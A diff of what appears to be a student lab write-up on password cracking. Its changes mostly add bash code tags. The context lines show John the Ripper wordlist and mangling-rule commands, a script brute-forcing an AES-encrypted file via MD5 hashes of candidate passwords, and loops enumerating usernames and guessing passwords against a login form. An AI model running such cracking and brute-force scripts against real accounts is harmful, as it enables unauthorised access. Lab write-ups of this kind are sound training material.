@@ -35,7 +35,10 @@ Through this command, I was able to crack rest of the users
 
 This one occupied most of my time. To crack hard users, we will use wordlists with "mangling rules" provided by JTR. 
 
-```~/JohnTheRipper-unstable-jumbo/run/john --rules --wordlist=/home/student/wordlists/YahooVoicePasswords.txt hard_dump```
+```~/JohnTheRipper-unstable-jumbo/run/john --rules --wordlist=/home/student/wordlists/YahooVoicePasswords.txt hard_dump``` 
+
+<br> 
+
 ```~/JohnTheRipper-unstable-jumbo/run/john --rules --wordlist=/home/student/wordlists/RockYouPasswords.txt hard_dump```
 
 However, I was only able to find 4 users with this. For the 5th user, I used ```--rules:single```. This is a hybrid of mangling rules with simple mode. It turned out that 5th user password was in a wordlist but it was flipped. 
@@ -54,7 +57,7 @@ Hacker encrypted the file: secret_file.aes256.txt
 - The MD5 hash of the hacker's password was used as the password given to openssl for the AES encryption.
 - The contents of the file are Lorem Ipsum in ascii text.
 
-```
+```bash
 rm /home/student/JohnTheRipper-unstable-jumbo/run/john.rec
 
 /home/student/JohnTheRipper-unstable-jumbo/run/john --wordlist=wordlists/YahooVoicePasswords.txt -stdout |
@@ -89,7 +92,7 @@ This is my exploit. Let's break it down to understand it.
 
 ```    output=`openssl enc -d -aes256 -a -k $hash -in secret_file.aes256.txt` ``` -> Try to decrypt using openssl. 
 
-```    
+```bash    
 if [ $? -eq 0 ]; then 
   echo $output | grep -P -n "[\x80-\xFF]"
         if [ $? -eq 0 ]; then
@@ -122,7 +125,7 @@ I tried a random username and I get a following alert:
 
 I run the following script to find active usernames: 
 
-```
+```bash
 cat facebook-firstnames.txt | head -n100000 |
   while IFS= read -r uname
   do
@@ -147,7 +150,7 @@ I tried to login with an active user "adam" with a random password. This is what
 
 Again, we can modify our existing exploit to search for "Invalid password." string here.
 
-```
+```bash
 wordlist="500-worst-passwords.txt"
 
 cat valid_usernames.txt |
